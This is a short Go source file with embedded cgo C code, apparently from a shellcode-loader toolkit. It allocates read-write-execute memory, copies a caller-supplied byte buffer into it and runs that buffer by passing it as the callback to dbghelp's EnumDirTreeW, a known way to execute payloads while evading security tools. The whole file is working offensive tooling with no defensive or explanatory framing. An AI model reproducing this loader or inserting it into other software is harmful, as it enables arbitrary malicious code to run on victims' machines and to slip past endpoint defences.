package cloader

/*
#cgo LDFLAGS: -ldbghelp
#include <windows.h>

typedef BOOL
(CALLBACK* PENUMDIRTREE_CALLBACKW)(
    PCWSTR FilePath,
    PVOID CallerData);

typedef BOOL (WINAPI* EnumDir)(HANDLE hProcess,
    PCWSTR RootPath,
    PCWSTR InputPathName,
    PWSTR OutputPathBuffer,
    PENUMDIRTREE_CALLBACKW cb,
    PVOID data);

typedef BOOL(WINAPI* Sysinit)(
    HANDLE hProcess,
    PCSTR UserSearchPath,
    BOOL fInvadeProcess);

void enumDirTreeW(uintptr_t p, int len) {
	HMODULE dbgaddr = LoadLibrary("dbghelp.dll");
 	if (!dbgaddr) return; // 检查库是否加载成功

    EnumDir enumdirfunc = (EnumDir)GetProcAddress(dbgaddr, "EnumDirTreeW");
    Sysinit sysinitfunc = (Sysinit)GetProcAddress(dbgaddr, "SymInitialize");
 	if (!enumdirfunc || !sysinitfunc) return; // 检查函数是否成功获取

    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        sysinitfunc(GetCurrentProcess(), 0, TRUE);

    	WCHAR dummy[522];
    	enumdirfunc(GetCurrentProcess(), L"C:\\Windows", L"*.log", dummy, (PENUMDIRTREE_CALLBACKW)addr, 0);

        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func EnumDirTreeW(p []byte) {
	C.enumDirTreeW((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
